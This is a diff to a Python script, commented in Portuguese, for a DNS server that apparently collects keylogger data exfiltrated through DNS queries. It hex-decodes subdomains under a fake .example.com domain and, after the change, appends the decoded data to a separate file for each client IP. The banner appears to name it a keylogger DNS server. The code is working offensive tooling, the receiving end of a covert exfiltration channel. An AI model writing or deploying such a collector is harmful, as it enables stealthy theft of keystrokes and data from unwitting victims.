@@ -15,8 +15,8 @@ _FAKE_DOMAIN = '.example.com.'
 ###############################################################
 # Classes e Funções
 ###############################################################
-def write_on_file(data):
-    with open('log.txt', 'a') as file:
+def write_on_file(path, data):
+    with open(path, 'a') as file:
         file.write(data)
         file.close()
 
@@ -25,7 +25,6 @@ def start_dns_server():
     # Cria um socket para ouvir requisições DNS
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     sock.bind(_DNS_ADDR)
-    print("Servidor DNS ouvindo na porta 9953...")
     print('''
 ╦╔═┌─┐┬ ┬╦  ┌─┐┌─┐┌─┐┌─┐┬─┐          
 ╠╩╗├┤ └┬┘║  │ ││ ┬│ ┬├┤ ├┬┘          
@@ -34,23 +33,26 @@ def start_dns_server():
 ││││ │ ├─┤   ║║║║║╚═╗├┤ ├┬┘└┐┌┘├┤ ├┬┘
 └┴┘┴ ┴ ┴ ┴  ═╩╝╝╚╝╚═╝└─┘┴└─ └┘ └─┘┴└─      
 ''')
+    print('Servidor DNS ouvindo na porta 9953...')
+    print('<Aguardando requisições>')
     
     while True:
         try:
             data, addr = sock.recvfrom(512)
 
-            #print(f'Recebi isso: {data}')
+            # Formando o path para cada cliente
+            path = str(addr[0]) + '.txt'
             
             # Lê a requisição DNS
             request = DNSRecord.parse(data)
             data = str(request.q.qname)
-            print(f'{data}')
+            print(f'{addr} | {data}')
             data = data.replace(_FAKE_DOMAIN, '')
             
             # Decodifica os dados do domínio
             data = ''.join([chr(int(data[i:i+2], 16)) for i in range(0, len(data), 2)])
             #print(f"Dados exfiltrados: {str(data)}")
-            write_on_file(data)            
+            write_on_file(path, data)            
             
             # Criando um objeto DNSRecord para a resposta
             dns_response = DNSRecord()
